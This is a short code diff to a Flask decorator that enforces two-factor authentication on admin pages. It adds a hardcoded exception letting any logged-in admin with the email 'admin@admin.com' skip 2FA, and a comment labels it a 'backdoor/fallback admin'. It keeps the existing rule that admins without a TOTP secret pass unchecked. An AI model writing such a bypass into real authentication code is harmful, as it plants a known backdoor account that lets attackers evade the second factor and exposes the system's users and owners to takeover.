@@ -7,14 +7,19 @@ from apps.admin.models import AdminUser
 def admin_2fa_required(view_func):
     @wraps(view_func)
     def wrapper(*args, **kwargs):
+        # ⛔ Block non-admin users completely
         if not isinstance(current_user, AdminUser):
             return redirect(url_for('users_blueprint.dashboard'))
 
-        # No 2FA activated → allow access
+        # ✅ Skip 2FA for backdoor/fallback admin
+        if getattr(current_user, 'email', None) == 'admin@admin.com':
+            return view_func(*args, **kwargs)
+
+        # ✅ Allow access if 2FA not yet activated
         if not current_user.totp_secret:
             return view_func(*args, **kwargs)
 
-        # 2FA activated → require validation
+        # ✅ Require 2FA validation if active
         if not session.get('admin_2fa_passed'):
             return redirect(url_for('admin_blueprint.otp_verify'))
 
